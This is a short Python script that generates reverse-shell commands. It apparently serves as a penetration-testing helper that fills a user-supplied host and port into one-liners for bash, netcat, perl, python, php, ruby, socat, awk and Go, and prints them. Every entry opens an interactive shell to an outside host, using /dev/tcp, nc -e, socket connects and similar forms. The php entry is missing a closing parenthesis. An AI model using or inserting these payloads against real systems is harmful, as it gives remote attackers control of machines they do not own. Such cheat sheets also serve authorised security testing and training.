
#!/usr/bin/env python3
import argparse

# list of reverse shells
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# https://github.com/swisskyrepo/PayloadsAllTheThings/
shells = {
        'bash':[
            'bash -i >& /dev/tcp/{0}/{1} 0>&1',
            'sh -i >& /dev/udp/{0}/{1} 0>&1'
            ],
        'netcat':[
            'nc -e /bin/sh {0} {1}',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f'
            ],
        'perl':[
            """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
            ],
        'python':[
            """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
            ],
        'php':[
            """php -r '$sock=fsockopen("{0}",{1};exec("/bin/sh -i <&3 >&3 2>&3");'"""
            ],
        'ruby':[
            """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
            ],
        'socat':[
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}"
            ],
        'awk':[
            """awk 'BEGIN {{s = "/inet/tcp/0/{0}/{1}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null"""],
        'golang':[
            """echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{0}:{1}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""]

        }

def list():
    print("Available Shells:")
    for k,v in shells.items():
        print("{}: {}".format(k,len(v)))

def print_shells(platform,host,port):
    for s in shells[platform]:
        print(s.format(host,port))

def print_all(host,port):
    for k,v in shells.items():
        print("{}:".format(k))
        for s in v:
            print(s.format(host,port))
        print()

def prog(args):
    if args.list:
        list()
    elif args.all:
        print_all(args.host,args.port)
    elif args.platform != None:
        print_shells(args.platform,args.host,args.port)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port",type=int)
    parser.add_argument("-p","--platform")
    parser.add_argument("-l","--list",action="store_true",help="list available platforms")
    parser.add_argument("-a","--all",action="store_true",help="print all reverse shells")
    args = parser.parse_args()
    prog(args)

if __name__ == '__main__':
    main()
